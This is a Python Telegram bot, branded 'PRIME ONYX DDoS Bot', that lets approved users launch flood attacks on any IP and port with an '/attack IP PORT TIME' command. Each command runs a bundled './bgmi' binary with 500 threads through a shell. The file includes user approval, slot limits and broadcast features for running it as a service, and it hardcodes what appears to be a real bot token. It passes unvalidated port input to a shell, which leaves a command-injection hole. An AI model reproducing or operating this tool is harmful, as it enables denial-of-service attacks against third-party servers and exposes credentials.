#!/usr/bin/env python3
import telebot
import subprocess
import threading
import time
import os
import json
import signal
import sys
from datetime import datetime
from flask import Flask, request, jsonify

# ============================================
# CONFIGURATION
# ============================================
TOKEN = '7378769730:AAE0hAtBkpVZJ-2ZO8G6EOfIxdfQK5CCPdQ'
ADMIN_ID = 1924991786
OWNER = '@ThunderOwnerx'
BGMI_PATH = './bgmi'
MAX_ATTACKS = 5
MAX_DURATION = 300
DEFAULT_THREADS = 500

# ============================================
# TELEGRAM BOT
# ============================================
bot = telebot.TeleBot(TOKEN)

# Store active attacks
active_attacks = {}
attack_lock = threading.Lock()
attack_counter = 0

# Approved users
approved_users = set()
APPROVED_FILE = "approved.json"

def load_approved():
    try:
        with open(APPROVED_FILE, 'r') as f:
            return set(json.load(f))
    except:
        return set()

def save_approved():
    with open(APPROVED_FILE, 'w') as f:
        json.dump(list(approved_users), f)

approved_users = load_approved()

def get_active_count():
    with attack_lock:
        now = datetime.now()
        return len([a for a in active_attacks.values() if a['end_time'] > now])

def get_free_slots():
    return MAX_ATTACKS - get_active_count()

# ============================================
# BOT COMMANDS
# ============================================

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    name = message.from_user.username or message.from_user.first_name
    is_admin = uid == ADMIN_ID
    is_approved = is_admin or uid in approved_users
    
    status = "👑 ADMIN" if is_admin else ("✅ APPROVED" if is_approved else "⏳ PENDING")
    
    msg = f"""
🔥 *PRIME ONYX DDoS Bot* 🔥

👤 *User:* @{name}
📊 *Status:* {status}
⚡ *Max Attacks:* {MAX_ATTACKS}
⏰ *Max Duration:* {MAX_DURATION}s

📌 *Commands:*
• `/attack IP PORT TIME` - Start attack
• `/status` - Bot status
• `/myinfo` - Your info
• `/help` - Help menu

👑 *Owner:* {OWNER}

💡 *Example:* `/attack 1.1.1.1 80 60`
"""
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack(message):
    global attack_counter
    uid = message.from_user.id
    name = message.from_user.username or message.from_user.first_name
    
    # Check approval
    if uid != ADMIN_ID and uid not in approved_users:
        bot.reply_to(message, "❌ *Not approved!* Contact @ThunderOwnerx", parse_mode='Markdown')
        return
    
    # Check slots
    if get_free_slots() <= 0:
        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, "❌ *Usage:* `/attack IP PORT TIME`\n📌 Example: `/attack 1.1.1.1 80 60`", parse_mode='Markdown')
            return
        
        ip, port, duration = args
        duration = int(duration)
        
        if duration < 10 or duration > MAX_DURATION:
            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
            return
        
        # Validate IP
        parts = ip.split('.')
        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode='Markdown')
            return
        
        # Check if bgmi exists
        if not os.path.exists(BGMI_PATH):
            bot.reply_to(message, f"❌ *Binary not found!* Contact admin.", parse_mode='Markdown')
            return
        
        # Create attack record
        with attack_lock:
            attack_counter += 1
            attack_id = attack_counter
            active_attacks[attack_id] = {
                'user_id': uid,
                'username': name,
                'target': f"{ip}:{port}",
                'end_time': datetime.now(),
                'duration': duration
            }
        
        slots = get_free_slots()
        
        bot.reply_to(message,
            f"🚀 *Attack Initiated!*\n\n"
            f"🎯 *Target:* `{ip}:{port}`\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🧵 *Threads:* `{DEFAULT_THREADS}`\n"
            f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
            f"⚡ *Attack running...*",
            parse_mode='Markdown')
        
        # Run attack in background
        thread = threading.Thread(target=run_attack, args=(attack_id, ip, port, duration, name, message.chat.id))
        thread.daemon = True
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status(message):
    uid = message.from_user.id
    
    if uid != ADMIN_ID and uid not in approved_users:
        bot.reply_to(message, "❌ *Access Denied!*", parse_mode='Markdown')
        return
    
    slots = get_free_slots()
    active = get_active_count()
    
    # Get user's active attacks
    user_active = []
    with attack_lock:
        for aid, attack in active_attacks.items():
            if attack['user_id'] == uid:
                remain = max(0, attack['duration'] - int((datetime.now() - attack['end_time']).total_seconds()))
                user_active.append(f"• `{attack['target']}` - {remain}s left")
    
    msg = f"""📊 *Bot Status*

🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`
⚡ *Active Attacks:* `{active}/{MAX_ATTACKS}`

👤 *Your Attacks:*
{chr(10).join(user_active) if user_active else 'No active attacks'}

✅ *Bot is ready!*"""
    
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo(message):
    uid = message.from_user.id
    name = message.from_user.username or message.from_user.first_name
    
    msg = f"""👤 *User Info*

📛 *Username:* @{name}
🆔 *User ID:* `{uid}`
✅ *Status:* {'Approved' if uid in approved_users or uid == ADMIN_ID else 'Pending'}
⚡ *Max Attacks:* `{MAX_ATTACKS}`
⏰ *Max Duration:* `{MAX_DURATION}s`

👑 *Owner:* {OWNER}"""
    
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    msg = f"""🆘 *From Server Help*

*Commands:*
`/start` - Welcome message
`/attack IP PORT TIME` - Start attack
`/status` - Bot status
`/myinfo` - Your info
`/help` - This menu

*Admin Commands:*
`/approve <user_id>` - Approve user
`/remove <user_id>` - Remove user
`/broadcast <msg>` - Send to all

*Limits:*
• Time: 10-{MAX_DURATION} seconds
• Threads: {DEFAULT_THREADS}
• Max concurrent: {MAX_ATTACKS}

👑 *Owner:* {OWNER}"""
    
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['approve'])
def approve(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "❌ *Usage:* `/approve <user_id>`", parse_mode='Markdown')
            return
        
        uid = int(args[1])
        approved_users.add(uid)
        save_approved()
        bot.reply_to(message, f"✅ *User `{uid}` approved!*", parse_mode='Markdown')
    except:
        bot.reply_to(message, "❌ *Invalid user ID!*", parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "❌ *Usage:* `/remove <user_id>`", parse_mode='Markdown')
            return
        
        uid = int(args[1])
        approved_users.discard(uid)
        save_approved()
        bot.reply_to(message, f"❌ *User `{uid}` removed!*", parse_mode='Markdown')
    except:
        bot.reply_to(message, "❌ *Invalid user ID!*", parse_mode='Markdown')

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    msg_text = message.text.replace('/broadcast', '').strip()
    if not msg_text:
        bot.reply_to(message, "❌ *Usage:* `/broadcast <message>`", parse_mode='Markdown')
        return
    
    success = 0
    failed = 0
    
    for uid in approved_users:
        try:
            bot.send_message(uid, f"📢 *Announcement*\n\n{msg_text}\n\n👑 {OWNER}", parse_mode='Markdown')
            success += 1
        except:
            failed += 1
    
    bot.reply_to(message, f"✅ *Broadcast sent!*\n\n📨 Success: `{success}`\n❌ Failed: `{failed}`", parse_mode='Markdown')

# ============================================
# ATTACK FUNCTION
# ============================================
def run_attack(attack_id, ip, port, duration, username, chat_id):
    try:
        cmd = f"{BGMI_PATH} {ip} {port} {duration} {DEFAULT_THREADS}"
        print(f"[+] Executing: {cmd}")
        
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Wait for attack to complete
        time.sleep(duration)
        process.terminate()
        
        slots = get_free_slots()
        bot.send_message(chat_id,
            f"✅ *Attack Completed!*\n\n"
            f"🎯 *Target:* `{ip}:{port}`\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
            f"👑 {OWNER}",
            parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ *Attack failed:* `{str(e)}`", parse_mode='Markdown')
    finally:
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]

# ============================================
# CLEANUP THREAD
# ============================================
def cleanup():
    while True:
        time.sleep(10)
        with attack_lock:
            now = datetime.now()
            expired = []
            for aid, attack in active_attacks.items():
                if (now - attack['end_time']).total_seconds() > attack['duration']:
                    expired.append(aid)
            for aid in expired:
                del active_attacks[aid]

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup, daemon=True)
cleanup_thread.start()

# ============================================
# MAIN
# ============================================
if __name__ == "__main__":
    print("=" * 50)
    print("⚡ Server Attack Bot")
    print("=" * 50)
    print(f"👑 Owner: {OWNER}")
    print(f"⚡ Max Attacks: {MAX_ATTACKS}")
    print(f"⏰ Max Duration: {MAX_DURATION}s")
    print(f"🔧 Binary: {BGMI_PATH}")
    print(f"✅ Approved Users: {len(approved_users)}")
    print("=" * 50)
    print("✅ Bot is running...")
    
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(15)